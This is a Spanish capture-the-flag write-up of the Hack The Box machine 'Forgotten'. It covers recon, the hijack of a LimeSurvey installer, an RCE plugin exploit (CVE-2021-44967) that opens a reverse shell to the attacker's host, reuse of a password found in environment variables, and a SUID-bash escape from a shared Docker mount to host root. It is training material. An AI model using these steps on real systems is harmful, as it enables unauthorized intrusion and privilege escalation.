---
tags:
title: Forgotten - Easy (HTB)
permalink: /Forgotten-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p22,80 10.129.234.81                                     
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-15 19:06 -0300
Nmap scan report for 10.129.234.81
Host is up (0.52s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 28:c7:f1:96:f9:53:64:11:f8:70:55:68:0b:e5:3c:22 (ECDSA)
|_  256 02:43:d2:ba:4e:87:de:77:72:ce:5a:fa:86:5c:0d:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: 403 Forbidden
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.53 seconds
```
## Website 

En el sitio principal me da un codigo de estado `403`.

### Feroxbuster

Con la enumeracion, me revela la ruta `/survey`.

```bash
feroxbuster -u http://forgotten.vl

<SNIP>
301      GET        9l       28w      313c http://forgotten.vl/survey => http://forgotten.vl/survey/
301      GET        9l       28w      320c http://forgotten.vl/survey/themes => http://forgotten.vl/survey/themes/
301      GET        9l       28w      320c http://forgotten.vl/survey/assets => http://forgotten.vl/survey/assets/
301      GET        9l       28w      320c http://forgotten.vl/survey/upload => http://forgotten.vl/survey/upload/
301      GET        9l       28w      319c http://forgotten.vl/survey/admin => http://forgotten.vl/survey/admin/
301      GET        9l       28w      317c http://forgotten.vl/survey/tmp => http://forgotten.vl/survey/tmp/
301      GET        9l       28w      321c http://forgotten.vl/survey/modules => http://forgotten.vl/survey/modules/
301      GET        9l       28w      321c http://forgotten.vl/survey/plugins => http://forgotten.vl/survey/plugins/
301      GET        9l       28w      327c http://forgotten.vl/survey/modules/admin => http://forgotten.vl/survey/modules/admin/
```
### LimeSurvey

Yendo a la ruta `/survey/admin`, veo que me sale un panel de instalacion para dicho Software.

![image-center](/assets/images/Pasted image 20260115191301.png)
### Create MySQL database

Si le doy a `Start installation` veo que me saln opciones de instalacion para una base de datos, donde puedo indicar el servidor donde se aloja la misma.

![image-center](/assets/images/Pasted image 20260115192338.png)
## Shell as limesvc @container

Para indicarle el servidor donde se aloja la misma primero necesito inicializar la base en mi sistema.

```bash
docker pull mysql
```

Después levanto el contenedor.

```bash
docker run -p 3306:3306 --rm --name mysqldb -e testing=password
mysql:latest
```

Luego en la misma pagina le puedo indicar el servidor, que en este caso, es mi `ip`.

![image-center](/assets/images/Pasted image 20260115191929.png)

Si le doy a `Next`, me sale un mensaje indicando que la base de datos no existe, así que le doy a `Create database`.

![image-center](/assets/images/Pasted image 20260115192011.png)

Luego de doy a `Populate database`.

![image-center](/assets/images/Pasted image 20260115192407.png)
### CVE-2021-44967

Ya despues, yendo a la ruta `/admin` veo que me sale un panel en donde me loguee con `admin:password`.

![image-center](/assets/images/Pasted image 20260115193426.png)

Y en el pie de la pagina, veo una versión.

![image-center](/assets/images/Pasted image 20260115194503.png)
### Exploit

Para dicha versión hay un exploit, el cual a grandes rasgos se basa en una ejecución remota de comandos a través de la instalación de `Plugins`, permitiendo al atacante subir un código `PHP` malicioso, este exploit lo encontré en [este repositorio](https://github.com/monke443/CVE-2021-44967) de Github.
Solo tuve que proporcionar las credenciales de sesión y la `url` donde corre este servicio, el cual es en `/survey`.

```bash
python3 exploit.py --url http://forgotten.vl/survey --user admin --password password --lhost 10.10.17.19 --lport 4444
[+] Logged in as admin
[+] Plugin uploaded
[+] Plugin installed
[+] Plugin activated
Check for shell!
```

Luego de unos segundos, recibo mi shell como el usuario `limesvc` en un container de `Docker`.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.81] 49378
Linux efaa6f5097ed 6.8.0-1033-aws #35~22.04.1-Ubuntu SMP Wed Jul 23 17:51:00 UTC 2025 x86_64 GNU/Linux
 22:40:18 up 32 min,  0 users,  load average: 0.01, 0.36, 4.71
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
limesvc
```
## Shell as root @container
### ENV

Listando las variables de entorno con `env`, veo una variable `LIMESURVEY_PASS`, en el cual se seteo una password.

```bash
limesvc@efaa6f5097ed:/$ env
SHELL=bash
HOSTNAME=efaa6f5097ed
PHP_VERSION=8.0.30
APACHE_CONFDIR=/etc/apache2
PHP_INI_DIR=/usr/local/etc/php
GPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4 39B641343D8C104B2B146DC3F9C39DC0B9698544
PHP_LDFLAGS=-Wl,-O1 -pie
PWD=/
APACHE_LOG_DIR=/var/log/apache2
LANG=C
LS_COLORS=
PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make           pkg-config               re2c
LIMESURVEY_PASS=5W5HN4K4GCXf9E
<SNIP>
```
### Shell as limesvc @ forgotten

La misma la use para convertirme en `root` en el contenedor.

```bash
limesvc@efaa6f5097ed:/$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for limesvc: 
root@efaa6f5097ed:/#
```

Y además las mismas son validas para el mismo usuario en la maquina `host`.

```bash
ssh limesvc@forgotten.vl                          
Warning: Permanently added 'forgotten.vl' (ED25519) to the list of known hosts.
(limesvc@forgotten.vl) Password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1033-aws x86_64)
<SNIP>

limesvc@forgotten:~$ cat user.txt 
7db45ef4928c00e99fb9e621b59468af
```
## Shell as root

Viendo en el directorio `/opt` veo que esta la carpeta donde corre `limesurvey`.

```bash
limesvc@forgotten:/opt$ cd limesurvey/
limesvc@forgotten:/opt/limesurvey$ ls
LICENSE    SECURITY.md  application  docs         index.php  locale   node_modules      plugins        psalm-strict.xml  setdebug.php  tmp     vendor
README.md  admin        assets       gulpfile.js  installer  modules  open-api-gen.php  psalm-all.xml  psalm.xml         themes        upload
```
### Docker 

La cual la misma esta en el contenedor, pero en distinta ruta, así que llegue a pensar que quizás tengan relación entre si, por lo que en un archivo coloque `"test"`, en el contenedor.

```bash
root@efaa6f5097ed:/var/www/html/survey# echo "test" > test.txt
```

Y el mismo se ve reflejado en la maquina host.

```bash
limesvc@forgotten:/opt/limesurvey$ cat test.txt 
test
```

Además viendo los permisos, como en el contenedor lo ejecute como el usuario `root`, en la maquina host, tambien tiene los permisos del mismo.

```bash
limesvc@forgotten:/opt/limesurvey$ ls -la
total 1380
drwxr-xr-x  15 limesvc limesvc    4096 Jan 15 22:43 .
drwxr-xr-x   4 root    root       4096 Dec  2  2023 ..
<SNIP>
-rw-r--r--   1 root    root          5 Jan 15 22:42 test.txt
drwxr-xr-x   5 limesvc limesvc    4096 Nov 27  2023 themes
drwxr-xr-x   5 limesvc limesvc    4096 Jan 15 22:38 tmp
drwxr-xr-x   9 limesvc limesvc    4096 Nov 27  2023 upload
drwxr-xr-x  36 limesvc limesvc    4096 Nov 27  2023 vendor
```
### Shell

Por lo que se me ocurrió copiar la `bash`, en el contenedor, otorgándole permisos `SUID` para poder usarla desde la maquina host, y poder convertirme en `root` con el parámetro `-p`.

```bash
root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash  bash
root@efaa6f5097ed:/var/www/html/survey# ls
LICENSE    SECURITY.md  application  bash  gulpfile.js  installer  modules       open-api-gen.php  psalm-all.xml     psalm.xml     test.txt  tmp     vendor
README.md  admin        assets       docs  index.php    locale     node_modules  plugins           psalm-strict.xml  setdebug.php  themes    upload
root@efaa6f5097ed:/var/www/html/survey# chmod u+s bash
```

Luego solo me basto, ejecutar la misma con `-p` de privilege, y me convertí en `root`.

```bash
limesvc@forgotten:/opt/limesurvey$ /opt/limesurvey/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/
cat: /root/: Is a directory
bash-5.1# cat /root/root.txt 
821633629206aa9a50e0cef0c06c6611
```

`~Happy Hacking.`